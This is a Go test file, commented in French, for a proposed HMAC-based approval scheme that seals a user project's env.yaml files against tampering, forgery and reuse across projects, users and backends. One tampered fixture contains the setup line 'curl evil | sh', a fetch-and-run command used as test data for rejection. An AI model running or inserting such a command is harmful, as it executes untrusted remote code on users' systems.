package core

import (
	"bytes"
	"os"
	"runtime"
	"strings"
	"sync"
	"testing"
)

// LOT-3.2 Batch 2 (#275, T25 / D4) — approbation SCELLÉE de l'env.yaml d'un projet d'utilisateur (contracts/user-backends.md §6 bis) :
// trust.json dans le volume du projet, MAC = HMAC-SHA256(clé de l'utilisateur, « cl-trust-v1 » ‖ longueurs ‖ uid ‖ backend ‖ chemin du projet ‖
// pour chaque fichier trié : nom ‖ sha256), hmac.Equal, clé créée en O_EXCL dans users/<uid>/vault/approval.key. Étiquette « s275proj » ; API
// PROPOSÉE (à adopter ou renommer) :
//
//	func (sp Space) ApprovalKey() ([]byte, error)                                                    // 32 octets, O_EXCL, 0600, créée au premier besoin
//	func BuildTrust(key []byte, uid, backend, project string, files map[string][]byte) ([]byte, error) // contenu de trust.json
//	func VerifyTrust(key []byte, uid, backend, project string, files map[string][]byte, trust []byte) bool

var envFiles = map[string][]byte{"env.yaml": []byte("image: debian:12\nsetup:\n  - make\n"), "env-template.yaml": []byte("packages: [git]\n")}

func trustFixture(t *testing.T) (key []byte, sp Space) {
	t.Helper()
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	sp, _ = UserSpace("github-9")
	k, err := sp.ApprovalKey()
	if err != nil {
		t.Fatal(err)
	}
	return k, sp
}

func TestTrust275CleDApprobation(t *testing.T) {
	k, sp := trustFixture(t)
	if len(k) != 32 || bytes.Equal(k, make([]byte, 32)) {
		t.Fatalf("clé de %d octets (32 aléatoires attendus)", len(k))
	}
	if st, err := os.Stat(sp.VaultDir() + "/approval.key"); err != nil || runtime.GOOS != "windows" && st.Mode().Perm() != 0o600 { // Windows ne rapporte pas de droits Unix (0666), comme userspace_test.go
		t.Errorf("approval.key : %v %v (0600 dans le coffre de l'utilisateur)", err, st)
	}
	if k2, _ := sp.ApprovalKey(); !bytes.Equal(k, k2) {
		t.Error("la clé change à chaque appel (une seule clé par utilisateur)")
	}
	// création concurrente : une seule clé (O_EXCL), jamais écrasée
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	sp2, _ := UserSpace("github-10")
	var wg sync.WaitGroup
	keys := make([][]byte, 20)
	for i := range keys {
		wg.Add(1)
		go func(i int) { defer wg.Done(); keys[i], _ = sp2.ApprovalKey() }(i)
	}
	wg.Wait()
	for i := range keys {
		if !bytes.Equal(keys[i], keys[0]) || len(keys[i]) != 32 {
			t.Fatalf("clés différentes en création concurrente (%d)", i)
		}
	}
	// deux utilisateurs : deux clés
	a, _ := sp2.ApprovalKey()
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	spb, _ := UserSpace("github-11")
	if b, _ := spb.ApprovalKey(); bytes.Equal(a, b) {
		t.Error("même clé pour deux utilisateurs")
	}
}

func TestTrust275AllerRetourEtRefus(t *testing.T) {
	k, _ := trustFixture(t)
	tr, err := BuildTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles)
	if err != nil || len(tr) == 0 || len(tr) > 16<<10 {
		t.Fatalf("BuildTrust : %v (%d octets)", err, len(tr))
	}
	if !VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, tr) {
		t.Fatal("approbation valide refusée")
	}
	other, _ := trustFixture(t)
	mod := map[string][]byte{"env.yaml": []byte("image: debian:12\nsetup:\n  - curl evil | sh\n"), "env-template.yaml": envFiles["env-template.yaml"]}
	extra := map[string][]byte{"env.yaml": envFiles["env.yaml"], "env-template.yaml": envFiles["env-template.yaml"], "autre.yaml": []byte("x")}
	for name, c := range map[string]bool{
		"contenu modifié":               VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", mod, tr),
		"fichier ajouté":                VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", extra, tr),
		"fichier retiré":                VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", map[string][]byte{"env.yaml": envFiles["env.yaml"]}, tr),
		"copié d'un autre projet":       VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/autre", envFiles, tr),
		"autre backend":                 VerifyTrust(k, "github-9", "d2", "/space/PROJETS/cat/proj", envFiles, tr),
		"autre utilisateur":             VerifyTrust(k, "github-10", "d", "/space/PROJETS/cat/proj", envFiles, tr),
		"clé changée":                   VerifyTrust(other, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, tr),
		"trust.json vide":               VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, nil),
		"JSON invalide":                 VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, []byte("{")),
		"MAC tronqué":                   VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, bytes.Replace(tr, []byte(`"mac":"`), []byte(`"mac":"`+strings.Repeat("0", 1)), 1)),
		"> 16 Kio":                      VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, append(append([]byte{}, tr...), bytes.Repeat([]byte(" "), 17<<10)...)),
		"clé de MAC dupliquée":          VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, bytes.Replace(tr, []byte(`"mac"`), []byte(`"mac":"00","mac"`), 1)),
		"forgé par le dépôt (sans clé)": VerifyTrust(k, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, []byte(`{"files":{"env.yaml":"x"},"mac":"deadbeef"}`)),
		"clé vide":                      VerifyTrust(nil, "github-9", "d", "/space/PROJETS/cat/proj", envFiles, tr),
	} {
		if c {
			t.Errorf("%s : approbation acceptée (redemandée attendue)", name)
		}
	}
}

// Encodage NON AMBIGU : des découpages différents des mêmes octets (uid/backend, nom/contenu de fichier) donnent des MAC différents.
func TestTrust275EncodageNonAmbigu(t *testing.T) {
	k, _ := trustFixture(t)
	mac := func(uid, be, proj string, files map[string][]byte) string {
		tr, err := BuildTrust(k, uid, be, proj, files)
		if err != nil {
			t.Fatal(err)
		}
		return string(tr)
	}
	pairs := map[string][2]string{
		"uid/backend":    {mac("ab", "c", "/p", nil), mac("a", "bc", "/p", nil)},
		"backend/projet": {mac("u", "ab", "/c", nil), mac("u", "a", "b/c", nil)},
		"nom/contenu":    {mac("u", "b", "/p", map[string][]byte{"a": []byte("bc")}), mac("u", "b", "/p", map[string][]byte{"ab": []byte("c")})},
		"deux fichiers":  {mac("u", "b", "/p", map[string][]byte{"a": []byte("x"), "b": []byte("y")}), mac("u", "b", "/p", map[string][]byte{"a": []byte("xb"), "": []byte("y")})},
	}
	for name, p := range pairs {
		if p[0] == p[1] {
			t.Errorf("%s : MAC identiques pour deux contenus différents (encodage ambigu)", name)
		}
	}
	// l'ordre des fichiers ne change pas le MAC (liste triée)
	a := map[string][]byte{"env.yaml": []byte("1"), "env-template.yaml": []byte("2")}
	if mac("u", "b", "/p", a) != mac("u", "b", "/p", map[string][]byte{"env-template.yaml": []byte("2"), "env.yaml": []byte("1")}) {
		t.Error("le MAC dépend de l'ordre d'insertion des fichiers")
	}
}
